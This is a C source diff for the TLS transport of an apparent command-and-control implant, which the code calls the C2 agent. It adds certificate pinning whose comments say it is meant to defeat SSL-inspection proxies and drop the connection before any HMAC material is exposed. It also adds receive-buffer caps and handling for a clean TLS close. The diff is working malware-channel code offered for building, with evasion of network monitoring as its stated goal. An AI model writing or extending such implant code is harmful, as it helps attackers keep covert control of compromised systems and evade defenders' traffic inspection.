@@ -453,7 +453,56 @@ static BOOL _tls_handshake(PTLS_CONTEXT pCtx, const char *pszHost)
 
     if (ss != SEC_E_OK) return FALSE;
     ss = QueryContextAttributes(&pCtx->hCtx, SECPKG_ATTR_STREAM_SIZES, &pCtx->streamSz);
-    return ss == SEC_E_OK;
+    if (ss != SEC_E_OK) return FALSE;
+
+#ifdef C2_CERT_PIN
+    /*
+     * Certificate pinning — F-04 fix.
+     *
+     * After the SChannel handshake succeeds, retrieve the server's leaf
+     * certificate and compare its SHA-256 thumbprint against the pinned
+     * value supplied at build time via:
+     *
+     *   make C2_IP=... C2_CERT_PIN=aabbccddeeff...  (64 hex chars = 32 bytes)
+     *
+     * This prevents an SSL-inspection proxy from MITM'ing the connection:
+     * the proxy presents its own certificate which will not match the pin,
+     * and the agent drops the connection before any HMAC material is sent.
+     *
+     * C2_CERT_PIN must be defined as a brace-enclosed byte literal, e.g.:
+     *   -DC2_CERT_PIN="{0xaa,0xbb,...}"   (32 bytes, 64 hex chars)
+     *
+     * Generate with:
+     *   openssl x509 -in server.pem -noout -fingerprint -sha256
+     *   (strip colons, split into \xNN pairs)
+     */
+    {
+        static const BYTE expected_pin[32] = C2_CERT_PIN;
+        PCCERT_CONTEXT pCert = NULL;
+        BOOL pinOk = FALSE;
+
+        if (QueryContextAttributes(&pCtx->hCtx,
+                SECPKG_ATTR_REMOTE_CERT_CONTEXT, &pCert) == SEC_E_OK && pCert) {
+
+            BYTE hash[32] = {0};
+            DWORD hashLen = sizeof(hash);
+
+            if (CertGetCertificateContextProperty(pCert,
+                    CERT_SHA256_HASH_PROP_ID, hash, &hashLen) && hashLen == 32) {
+
+                pinOk = (memcmp(hash, expected_pin, 32) == 0);
+            }
+            CertFreeCertificateContext(pCert);
+        }
+
+        if (!pinOk) {
+            /* Certificate does not match pin — likely SSL inspection proxy */
+            return FALSE;
+        }
+    }
+#endif /* C2_CERT_PIN */
+
+    return TRUE;
 }
 
 
@@ -558,11 +607,21 @@ static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
     memcpy(pDst, pCtx->pPlainBuf, cbGot);
     pCtx->cbPlainBuf = 0;
 
+    /* Hard cap on the receive buffer to prevent unbounded growth when the
+     * peer streams junk or a MITM floods incomplete TLS records.
+     * 4 × TLS_MAX_RECORD_SIZE (≈ 64 KB) is generous for any real record. */
+#ifndef TLS_RECV_BUF_MAX
+#define TLS_RECV_BUF_MAX (256 * 1024)   /* 256 KB — well above any TLS record */
+#endif
     while (cbGot < cbWant) {
         if (pCtx->cbRecvBuf < pCtx->streamSz.cbHeader) {
             DWORD cbSpace = pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf;
             if (cbSpace == 0) {
+                if (pCtx->cbRecvBufAlloc >= TLS_RECV_BUF_MAX) {
+                    pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE;
+                }
                 DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
+                if (cbNew > TLS_RECV_BUF_MAX) cbNew = TLS_RECV_BUF_MAX;
                 BYTE *p = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
                 if (!p) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
                 pCtx->pRecvBuf = p; pCtx->cbRecvBufAlloc = cbNew;
@@ -590,7 +649,11 @@ static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
         if (ss == SEC_E_INCOMPLETE_MESSAGE) {
             DWORD cbSpace = pCtx->cbRecvBufAlloc - pCtx->cbRecvBuf;
             if (cbSpace == 0) {
+                if (pCtx->cbRecvBufAlloc >= TLS_RECV_BUF_MAX) {
+                    pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE;
+                }
                 DWORD cbNew = pCtx->cbRecvBufAlloc * 2;
+                if (cbNew > TLS_RECV_BUF_MAX) cbNew = TLS_RECV_BUF_MAX;
                 BYTE *p = (BYTE *)realloc(pCtx->pRecvBuf, cbNew);
                 if (!p) { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
                 pCtx->pRecvBuf = p; pCtx->cbRecvBufAlloc = cbNew; cbSpace = cbNew - pCtx->cbRecvBuf;
@@ -605,8 +668,11 @@ static BOOL _tls_raw_recv(PTLS_CONTEXT pCtx, BYTE *pDst, DWORD cbWant)
             continue;
         }
 
-        if (ss == SEC_I_RENEGOTIATE) { pCtx->lastErr = TLS_ERR_PROTO; return FALSE; }
-        if (ss != SEC_E_OK)          { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
+        if (ss == SEC_I_RENEGOTIATE)    { pCtx->lastErr = TLS_ERR_PROTO;  return FALSE; }
+        /* SEC_I_CONTEXT_EXPIRED = clean TLS close_notify from the peer.
+         * This is not a crypto error — treat it as a clean socket close.  */
+        if (ss == SEC_I_CONTEXT_EXPIRED){ pCtx->lastErr = TLS_ERR_SOCKET; return FALSE; }
+        if (ss != SEC_E_OK)             { pCtx->lastErr = TLS_ERR_CRYPTO; return FALSE; }
 
         for (int i = 0; i < 4; i++) {
             if (bufs[i].BufferType == SECBUFFER_DATA && bufs[i].cbBuffer > 0) {
